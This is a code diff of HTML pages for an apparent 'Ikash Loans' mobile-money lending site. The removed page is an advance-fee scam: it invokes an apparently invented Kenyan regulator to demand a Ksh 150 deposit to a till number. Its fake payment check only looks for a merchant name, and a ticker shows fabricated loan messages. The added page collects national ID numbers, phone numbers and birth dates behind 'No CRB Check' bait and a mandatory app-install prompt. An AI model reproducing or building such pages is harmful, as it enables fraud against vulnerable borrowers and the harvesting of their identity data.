@@ -1,609 +1,331 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loan Eligibility</title>
+    <!-- Favicon Links -->
+    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
+    <link rel="manifest" href="images/site.webmanifest">
+    <title>Ikash Loans App</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="shared.css">
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 20px;
-            /*background: linear-gradient(135deg, #555ab1, #070930);*/
-            background: linear-gradient(135deg, #070930, #555ab1);
-            /*background-color: #f2f8fc;*/
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: bold;
-            font-size: 1.2em;
-        }
-
-        .logo-circle {
-            width: 30px;
-            height: 30px;
-            background-color: #cdf4d0;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .bolt {
-            color: #00c853;
-            font-size: 1.2em;
-        }
-
-        .dark-mode {
-            background: #cdf4d0;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        h1 {
-            font-size: 1.0em;
-            text-align: center;
-            margin: 30px 0;
-            margin-top: + 15%;
-            font-weight: bold;
-        }
-
-        h2 {
-            font-size: 1.2em;
-            text-align: center;
-            margin: 30px 20px;
-            margin-top: + 25%;
-            border-radius: 5px;
-            width: 70%;
-            margin-left: 15%;
-            color: white;
-        }
-
-        h4 {
-            font-size: 0.8em;
-            text-align: center;
-            margin: 30px 20px;
-            margin-top: 4%;
-            border-radius: 5px;
-            width: 100%;
-            margin-left: 0%;
-            color: white;
-        }
-
-        h3 {
-            font-size: 0.1em;
-            text-align: center;
-            margin: 30px 0;
-            margin-top: -10%;           
-        }
-
-        h5 {
-            font-size: 0.8em;
-            margin: 30px 0;
-            margin-left: 5%;
-            margin-top: -5%;
-        }
-
-        h6 {
-            font-size: 1.1em;
-            margin: 30px 0;
-            margin-left: 5%;
-        }
-
-        .loan-message {
-            background: linear-gradient(135deg, #555ab1, #070930);
-            padding: 20px;
-            border-radius: 52px;
-            margin: 20px 0;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            height: 65%;
-            margin-top: 4.5%;
-        }
-
-        .loan-messages {
-            background: linear-gradient(135deg, #555ab1, #070930);
-            padding: 10px;
-            border-radius: 12px;
-            margin: 10px 0;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            margin-top: 4.5%;
-            height: 20%;
-        }
-
-        .verify-button {
-            background: linear-gradient(135deg, #555ab1, #070930);
-            color: white;
-            font-size: 1.2em;
-            padding: 12px 20px;
-            border-radius: 52px;
-            margin: 10px 0;
-            margin-left: 10%;
-            font-weight: bold;
-            width: 80%;
-            border: none;
-
-            border: none;
-            width: 80%;
-            font-size: 1.2em;
-            cursor: pointer;
-            margin: 10px 0;
-            margin-left: 10%;
-            font-weight: bold;
-        }
-
-        .verify-buttons {
-            background: #05a247;
-            color: white;
-            /*padding: 12px 20px;*/
-            border-radius: 25px;
-            border: none;
-            width: 100%;
-            align-self: center;
-            align-items: center;
-            align-content: center;
-            font-size: 1em;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-
-        .loan-table {
-            background: #ddeefa;
-            border-radius: 12px;
-            border-color: #000000;
-            overflow: hidden;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            margin-top: -7%;
-            width: 90%;
-            margin-left: 5%;
-        }
-
-        .loan-tabless {
-            background: #ddeefa;
-            border-radius: 12px;
-            border-color: #000000;
-            overflow: hidden;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            margin-top: +5%;
-            width: 100%;
-            margin-left: 0.5%;
-        }
-
-        .loan-table div {
-            display: flex;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .loan-table div:last-child {
-            border-bottom: none;
-        }
-
-        .loan-table .label {
-            flex: 1;
-            padding: 15px;
-            background: #ddeefa;
-            color: #000000;    
-            width: 100%;        
-        }
-
-        .loan-table .labels {
-            flex: 1;
-            padding: 15px;
-            background: #ddeefa51;
-            color: #000000;
-            width: 100%;
-        }
-
-        .loan-table .value {
-            flex: 1;
-            padding: 15px;
-            color: #333;
-        }
-
-        .loan-tables div {
-            display: flex;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .loan-tables div:last-child {
-            border-bottom: none;
-        }
-
-        .loan-tabless .label {
-            flex: 1;
-            padding: 15px;
-            background: #ddeefa;
-            color: #000000;            
-        }
-
-        .loan-tabless .labels {
-            flex: 1;
-            padding: 15px;
-            background: #ddeefa51;
-            color: #000000;
-            width: 100%;
-        }
-
-        .loan-tabless .value {
-            flex: 1;
-            padding: 15px;
-            color: #333;
-        }
-
-        .status-pending {
-            background: #ad6721;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 15px;
-            display: inline-block;
-        }
-
-        .status-not-verified {
-            background: #e6061d;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 15px;
-            display: inline-block;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 0.9em;
-            color: wheat;
-        }
-
-        .open-modal-btn {
-
-
-            
-            /*margin-top: 20px;*/
-            
-
-            background: linear-gradient(135deg, greenyellow, green);
-            color: black;
-            font-size: 1.0em;
-            padding: 8px 10px;
-            border-radius: 12px;
-            margin: 10px 0;
-            margin-left: 5%;
-            font-weight: bold;
-            width: 90%;
-            border: none;
-            cursor: pointer;
-        }
-
-        .confirm-btn:hover {
-            background: #00b34a;
-        }
-
-        /**************************************/
-        .overlay {
+        /* PWA Install Popup Styles */
+        #pwa-install-popup {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .pwa-popup-content {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+        }
+
+        .pwa-popup-content img {
+            width: 150px;
+            height: 150px;
+            margin: 1rem auto;
+            display: block;
+        }
+
+        .pwa-popup-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1rem;
+        }
+
+        .pwa-popup-buttons button {
+            flex: 1;
+            margin: 0 0.5rem;
+            padding: 1rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .pwa-install-btn {
+            background: linear-gradient(135deg, #6b73ff, #000dff);
+            color: white;
+        }
+
+        .pwa-cancel-btn {
+            background: #f1f1f1;
+            color: #333;
+        }
+        /*------------------------------------------------------------------------------------------*/
+
+
+.loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
             display: none;
             justify-content: center;
             align-items: center;
-            z-index: 1;
+            z-index: 1000;
         }
 
-        .modal {
-            background: linear-gradient(135deg, #555ab1, #070930);
-            padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 90%;
-            max-width: 400px;
-            position: relative;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #fff;
+            border-top: 4px solid #4776E6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
 
-        .close-btn {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            background: transparent;
-            border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
-        p {
-            color: white;
-            margin-bottom: 1.5rem;
-            line-height: 1.5;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 0.8rem;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            margin-bottom: 1rem;
-            font-size: 1rem;
-            align-items: center;
-            align-self: center;
-            text-align: center;
-            align-content: center;
-        }
-
-        .verify-btn {
-            background: linear-gradient(135deg, greenyellow, green);
-            color: #070930;
-            font-size: 1.2em;
-            padding: 12px 20px;
-            border-radius: 52px;
-            margin: 10px 0;
-            margin-left: 10%;
-            font-weight: bold;
-            width: 80%;
-            border: none;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .verify-btnn {
-            background: linear-gradient(135deg, greenyellow, green);
-            color: #070930;
-            font-size: 0.8em;
-            padding: 12px 20px;
-            border-radius: 52px;
-            /*margin: 10px 0;*/
-            margin-left: 35%;
-            font-weight: bold;
-            width: 60%;
-            border: none;
-            cursor: pointer;
-            /*transition: background 0.2s;*/
-        }
-
-        .verify-btn:hover {
-            background: linear-gradient(135deg, green, greenyellow);
-        }
-
-        .message {
-            display: none;
-            margin-top: 1rem;
-            padding: 0.8rem;
-            border-radius: 6px;
-            text-align: center;
-        }
-
-        .success {
-            background: #e8f5e9;
-            color: #2e7d32;
-        }
-
-        .error {
-            background: #ffebee;
-            color: #c62828;
-        }
-    </style>
+</style>
 </head>
+
 <body>
-<h3>.</h3>
-<div class="loan-messages">
-    <h4 id="scrollmsg" style="background: linear-gradient(135deg, rgb(255, 255, 255), white); color: #070930;" >🔊     User 0724***689 loaned KES 8,390... 2 mins ago</h4>
-</div>
-    <div class="loan-message">
-    <!--h4 id="scrollmsg" style="background: linear-gradient(135deg, rgb(255, 255, 255), white); color: #070930;" >User 0724***689 loaned KES 8,390... 2 mins ago</h4-->
-        <h1 style="color: greenyellow;"> ACCOUNT SAVINGS </h1>
-        <h5 style="color: rgb(253, 252, 252);">Dear <strong style="font-weight: bolder; color: #00c853;" id="usernames">Customer,</strong> In compliance with the Kenya Financial Services Authority (KFSA) regarding credit and savings regulations, HAKIKA R PROVISIONS requires you to deposit a minimum savings amount of Ksh 150 to your Ikash Loans account, withdrawable exclusively upon successful completion of your first loan repayment cycle.</h5>
+    <div class="loading-overlay">
+        <div class="spinner"></div>
     </div>
 
-    <div class="loan-tabless">
-        <div>
-            <div class="labels" ><span style="margin-left: 5%;"><strong>How to save to your Ikash Loans A/C:</strong></span></div>
-            <!--div class="labels" id="user-name">Wei bwana</div-->
-        </div>
-        <div>
-            <div class="labels" >Go to M~Pesa : <span style="margin-left: 5.5%;"> <strong>M~pesa</strong></span></div>
-            <!--div class="labels" id="user-name"></div-->
-        </div>
-        <div>
-            <div class="labels" >Lipa na M~Pesa :<span style="margin-left: 3%;"> <strong>Buy Goods & Services</strong></span></div>
-            <!--div class="labels" id="user-name">Wei bwana</div-->
-        </div>
-        <div>
-            <div class="labels" >Enter Till Number :<span style="margin-left: 2%;"> <strong>397994</strong></span></div>
-            <!--div class="labels" id="user-name">Wei bwana</div-->
-        </div>
-        <div>
-            <div class="labels" >
-                <button class="verify-btnn" onclick="copyTillNumber()" id="copytill">CLICK TO COPY TILL</button>
+        <!-- PWA Install Popup -->
+        <div id="pwa-install-popup">
+            <div class="pwa-popup-content">
+                <div class="logo-container">
+                    <h1 class="logo-text">Ikash<br>Loans<br>App</h1>
+                </div>
+                <h2>Install Ikash Loans App</h2>
+                <p>For easy follow up, it is a requirement that you <strong>INSTALL</strong> our app!</p>
+                <!--img src="/images/icons/icon-192x192.png" alt="Mkopo ChapChap App Icon"-->
+                <div class="pwa-popup-buttons">
+                    <!--button class="pwa-cancel-btn" onclick="dismissPWAPopup()">Not Now</button-->
+                    <button class="pwa-install-btn" onclick="installPWA()">Install App</button>
+                </div>
             </div>
-            <!--div class="labels" id="user-name">Wei bwana</div-->
-        </div>
-        <div>
-            <div class="labels" >Enter Amount :<span style="margin-left: 13%;"> <strong>Ksh 150</strong></span></div>
-            <!--div class="labels" id="user-name">Wei bwana</div-->
-        </div>
-        <div>
-            <div class="labels" >Complete Payment :<span style="margin-left: 3%;"> <strong>Enter M~Pesa Pin</strong></span></div>
-            <!--div class="labels" id="user-name">Wei bwana</div-->
         </div>
 
-        <button class="open-modal-btn" onclick="goToSecondPage()">Verify Payment to Initiate Loan Disbursement</button>
-    </div>
 
-    <!---------------------------------------------------------------------------->
-    <div class="card">
-        <p id="paragraph"></p>
-    </div>
-    <div class="overlay">
-        <div class="modal">
-            <button class="close-btn" onclick="closeModals()">&times;</button>
-            <h2>Verify Payments</h2>
-            <p>Copy the entire confirmation message you received from M-PESA after making payments and paste in the text field below then click verify button</p>
-            
-            <textarea 
-                class="input-field" 
-                placeholder="Paste M-PESA Message Here"
-                rows="4"
-            ></textarea>
-            
-            <button class="verify-btn" onclick="verifyTransaction()">VERIFY</button>
-            
-            <div id="message" class="message"></div>
+
+
+    <header>
+        <nav class="navbar">
+            <div class="logo">Ikash Loans App</div>
+            <ul class="nav-links" id="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="about.html">About Us</a></li>
+                <li><a href="contact.html">Contact</a></li>
+                <li><a href="login.html">Login</a></li>
+            </ul>
+            <div class="hamburger" id="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </nav>
+    </header>
+
+    <div class="main-container">
+        <!-- Left Section with Content -->
+        <div class="left-content">
+            <h1>Ikash <br> Loan<br></h1>
+            <p>
+                Let us help you manage your finances effortlessly.
+                Get a loan for business, personal needs, emergencies, or more.
+            </p>
         </div>
-    </div>
-    <!---------------------------------------------------------------------------->
 
-<!--/div-->
+        <!-- Form Section (Aligned to the Right) -->
+        <div class="form-wrapper">
+            <h1>Find Your Loan Eligibility</h1>
+            <h3>We offer loans from Ksh. 2,000 - 25,000 loan to MPESA</h3>
 
-    <div class="footer">
-        © Ikash Loans Ke 2024
+            <form id="loanForm">
+                <input type="text" id="names" placeholder="Your Name" required="">
+                <select id="country" required="">
+                    <option value="" disabled="" selected="">Select County</option>
+                    <option value="kenya">Mombasa</option>
+                    <option value="tanzania">Kwale</option>
+                    <option value="mozambique">Kilifi</option>
+                    <option value="drc">Tana River</option>
+                    <option value="kenya">Lamu</option>
+                    <option value="tanzania">Taita Taveta</option>
+                    <option value="mozambique">Garisa</option>
+                    <option value="drc">Wajir</option>
+                    <option value="kenya">Mandera</option>
+                    <option value="tanzania">Marsabit</option>
+                    <option value="mozambique">Isiolo</option>
+                    <option value="drc">Meru</option>
+                    <option value="lesotho">Tharaka Nithi</option>
+                    <option value="ghana">Embu</option>
+                    <option value="egypt">Kitui</option>
+                    <option value="afghanistan">Machakos</option>
+                    <option value="south_africa">Makueni</option>
+                    <option value="lesotho">Nyandarua</option>
+                    <option value="ghana">Nyeri</option>
+                    <option value="egypt">Kirinyaga</option>
+                    <option value="afghanistan">Muranga</option>
+                    <option value="south_africa">Kiambu</option>
+                    <option value="tanzania">Turkana</option>
+                    <option value="mozambique">West Pokot</option>
+                    <option value="drc">Samburu</option>
+                    <option value="lesotho">Trans Nzoia</option>
+                    <option value="ghana">Uasin Gishu</option>
+                    <option value="egypt">Elgeyo Marakwet</option>
+                    <option value="afghanistan">Nandi</option>
+                    <option value="south_africa">Baringo</option>
+                    <option value="lesotho">Laikipia</option>
+                    <option value="ghana">Nakuru</option>
+                    <option value="egypt">Narok</option>
+                    <option value="afghanistan">Kajiado</option>
+                    <option value="lesotho">Kericho</option>
+                    <option value="ghana">Bomet</option>
+                    <option value="egypt">Kakamega</option>
+                    <option value="afghanistan">Vihiga</option>
+                    <option value="south_africa">Bungoma</option>
+                    <option value="lesotho">Busia</option>
+                    <option value="ghana">Siaya</option>
+                    <option value="egypt">Kisumu</option>
+                    <option value="afghanistan">Homa Bay</option>
+                    <option value="south_africa">Migori</option>
+                    <option value="south_africa">Kisii</option>
+                    <option value="ethiopia">Nyamira</option>
+                    <option value="egypt">Nairobi</option>
+                </select>
+                <input type="tel" id="mpesas" placeholder="MPESA Phone Number" required="">
+                <input type="text" id="idNumber" placeholder="National ID Number" required="">
+                <select id="loanType" required="">
+                    <option value="" disabled="" selected="">Select Gender</option>
+                    <option value="Personal">Female</option>
+                    <option value="Car">Male</option>
+                    <option value="Business">Other</option>
+                </select>
+                <input id="DOB" placeholder="Date of Birth: dd/mm/yy" required="">
+                <select id="maritalstatus" required="">
+                    <option value="" disabled="" selected="">Marital Status</option>
+                    <option value="Personal">Single</option>
+                    <option value="Car">Married</option>
+                    <option value="Business">Divorced</option>
+                </select>
+                <button type="submit">Next</button>
+            </form>
+            <p class="note">No CRB Check. No Guarantors. Disbursed to MPESA. No Paperwork.</p>
+
+            <p class="disclaimer">
+                By submitting you confirm that you accept the <a href="#">Terms and Conditions</a> and
+                <a href="#">Privacy Policy</a>.
+            </p>
+        </div>
     </div>
 
     <script>
-        const name = localStorage.getItem("name") || "John Doe";
-        document.getElementById("usernames").textContent = name + ", ";
-        const openModalBtn = document.querySelector('.open-modal-btn');
-        const overlay = document.querySelector('.overlay');
-        const modal = document.querySelector('.modal');
-        const closeBtn = document.querySelector('.close-btn');
-
-        openModalBtn.addEventListener('click', () => {
-            overlay.style.display = 'flex';
-            modal.style.display = 'block';
-        });
-
-        closeBtn.addEventListener('click', closeModals);
-        //overlay.addEventListener('click', closeModal);
-
-        function closeModal() {
-            overlay.style.display = 'none';
-            modal.style.display = 'none';
-            window.location.href = 'reviewpage.html';
-            localStorage.setItem('lnapplied', 'true');
+        // Existing Service Worker and other scripts from the previous document
+        // Service Worker Registration
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/service-worker.js')
+                    .then(registration => {
+                        console.log('Service Worker registered successfully:', registration.scope);
+                    })
+                    .catch(error => {
+                        console.log('Service Worker registration failed:', error);
+                    });
+            });
         }
 
-        function closeModals() {
-            overlay.style.display = 'none';
-            modal.style.display = 'none';
-            //window.location.href = 'reviewpage.html';
-        }
+        // PWA Install Popup Logic
+        let deferredPrompt;
+        let pwaInstallPopup = document.getElementById('pwa-install-popup');
 
-        function verifyTransaction() {
-            const input = document.querySelector('.input-field').value;
-            const messageDiv = document.getElementById('message');
-            
-            messageDiv.style.display = 'block';
-            
-            const name = "HAKIKA R PROVISIONS";
-            
-            if ((input.trim().length > 0) &&(input.includes(name))) {
-                messageDiv.className = 'message success';
-                messageDiv.textContent = 'Transaction verification successful!';
-                closeModal();
-            } else {
-                messageDiv.className = 'message error';
-                messageDiv.textContent = 'Please enter a valid message';
-            }
-        }
+        // Capture the install prompt
+        window.addEventListener('beforeinstallprompt', (e) => {
+            // Prevent the mini-infobar from appearing on mobile
+            e.preventDefault();
 
-        function copyTillNumber() {
-    const tillNumber = '397994';
-    navigator.clipboard.writeText(tillNumber).then(() => {
-        document.getElementById('copytill').innerText = "Till number copied!"
-        document.getElementById('copytill').style.color = 'black';
-        showToast("Till number copied to clipboard");
-    }).catch(err => {
-        console.error('Failed to copy text: ', err);
-    });
-}
-    </script>
-    <!------------------------------>
+            // Stash the event so it can be triggered later
+            deferredPrompt = e;
 
-    <script>
+            // Check if user has already dismissed the prompt
+            //const hasSeenInstallPrompt = localStorage.getItem('pwaInstallPromptDismissed');
 
-
-        window.onload = function () {
+            // Show popup after 2 seconds if not previously dismissed
             setTimeout(() => {
                // if (!hasSeenInstallPrompt) {
-                //scrollmsg.textContent = "`";
+                    pwaInstallPopup.style.display = 'flex';
                // }
-            //}, 2200); 
-        // Countdown Timer
-        let timeLeft = 1; // Countdown starting from 5 seconds
-        const scrollmsg = document.getElementById('scrollmsg');
-        //const contin = document.getElementById('continueBtn');
+            }, 1000);
+        });
 
-        function updateTimer() {
-            //scrollmsg.textContent = "";
-            if (timeLeft >= 16) {
-                clearInterval(timerInterval);
-                // Optionally disable buttons or change state after countdown ends
-                scrollmsg.textContent = "✔ Approved";
-                //contin.style.display = 'block';
-                //contin.display = ;          
-                
-            } else {   
-                setTimeout(() => {
-               // if (!hasSeenInstallPrompt) {
-                scrollmsg.textContent = "`";
-               // }
-            }, 2200); 
+        // Install PWA
+        function installPWA() {
+            // Hide the popup
+            pwaInstallPopup.style.display = 'none';
 
-                timeLeft++;                
-                if (timeLeft == 2){
-                    scrollmsg.textContent = "🔊     User 0724***689 loaned KES 8,390... 2 mins ago";
-                } else if (timeLeft == 3) {
-                    scrollmsg.textContent = "🔊     User 0701***111 loaned KES 8,500... 7 mins ago";
-                } else if (timeLeft == 4) {
-                    scrollmsg.textContent = "🔊     User 0745***122 loaned KES 6,495... 36 mins ago";
-                } else if (timeLeft == 5) {
-                    scrollmsg.textContent = "🔊     User 0708***343 loaned KES 4,890... 4 mins ago";
-                } else if (timeLeft == 6) {
-                    scrollmsg.textContent = "🔊     User 0711***602 loaned KES 6,000... 5 mins ago";
-                } else if (timeLeft == 7) {
-                    scrollmsg.textContent = "🔊     User 0797***630 loaned KES 6,090... 21 mins ago";
-                } else if (timeLeft == 8) {
-                    scrollmsg.textContent = "🔊     User 0700***091 loaned KES 15,050... 14 mins ago";
-                } else if (timeLeft == 9) {
-                    scrollmsg.textContent = "🔊     User 0711***368 loaned KES 11,300... 11 mins ago";
-                } else if (timeLeft == 10) {
-                    scrollmsg.textContent = "🔊     User 0720***142 loaned KES 9,500... 27 mins ago";
-                } else if (timeLeft == 11) {
-                    scrollmsg.textContent = "🔊     User 0710***177 loaned KES 6,400... 1 min ago";
-                } else if (timeLeft == 12) {
-                    scrollmsg.textContent = "🔊     User 0794***081 loaned KES 5,005... 8 mins ago";
-                } else if (timeLeft == 13) {
-                    scrollmsg.textContent = "🔊     User 0705***699 loaned KES 7,000... 30 mins ago";
-                } else if (timeLeft == 14) {
-                    scrollmsg.textContent = "🔊     User 0724***004 loaned KES 7,050... 12 mins ago";
-                } else if (timeLeft == 15) {
-                    scrollmsg.textContent = "🔊     User 0710***831 loaned KES 5,390... 23 mins ago";
-                    timeLeft = 0;
-                }
-                
+            // Show the install prompt
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+
+                // Wait for the user to respond to the prompt
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('User accepted the PWA install');
+                        localStorage.setItem('pwaInstallPromptDismissed', 'true');
+                    } else {
+                        console.log('User dismissed the PWA install');
+                    }
+
+                    // Reset the deferredPrompt
+                    deferredPrompt = null;
+                });
             }
-            //scrollmsg.textContent = "";
         }
-        scrollmsg.textContent = "";
-        const timerInterval = setInterval(updateTimer, 3800);
-    }, 2000);
+
+        // Dismiss PWA Popup
+        function dismissPWAPopup() {
+            pwaInstallPopup.style.display = 'none';
+            // Remember that user has dismissed the prompt
+            localStorage.setItem('pwaInstallPromptDismissed', 'true');
         }
-        
+
+        //--------------------------------------------------------------------------------------------------
+
+        //-------------------------------------------------------------------------------------------------
+        // Existing page load and other functions
+//        window.onload = function () {
+            // Check if app is already loaded
+  //          if (localStorage.getItem('loanapplied') === 'true') {
+    //            window.location.href = 'reviewpage.html';
+      //      } else if (localStorage.getItem('visited') === 'true') {
+        //        window.location.href = 'upplication-details.html';
+          //  }
+
+        //    document.getElementById('welcomeScreen').style.display = 'block';
+        //};
+
+        // [Rest of the existing JavaScript remains the same]
     </script>
-    <!--script src="loan-details.js"></script-->
-    <!--script src="index.js"></script-->
-</body>
-</html>
+
+    <script src="index.js"></script>
+
+    <footer>
+        <p>© 2025 Ikash Loans App. All rights reserved. <a href="index.html">Home</a></p>
+    </footer>
+
+
+
+</body></html>
